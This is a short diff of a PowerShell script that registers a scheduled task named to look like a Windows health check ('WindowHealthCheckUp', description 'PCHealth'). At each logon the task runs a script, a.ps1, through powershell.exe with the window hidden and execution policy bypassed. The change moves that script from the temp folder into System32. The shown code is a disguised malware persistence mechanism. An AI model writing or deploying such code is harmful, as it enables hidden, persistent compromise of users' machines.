@@ -12,7 +12,7 @@ $taskName = "WindowHealthCheckUp"
 Get-ScheduledTask | Where-Object {$_.TaskName -like $taskName} -ErrorAction SilentlyContinue -OutVariable task
 
 if (!$task) {
-    $action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-w hidden -Exec Bypass -NonI -File $env:TMP\a.ps1"
+    $action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-w hidden -Exec Bypass -NonI -File C:\Windows\System32\a.ps1"
     $trigger = New-ScheduledTaskTrigger -AtLogOn 
     Register-ScheduledTask -Action $action -Trigger $trigger -TaskName $taskName -Description 'PCHealth'
 }
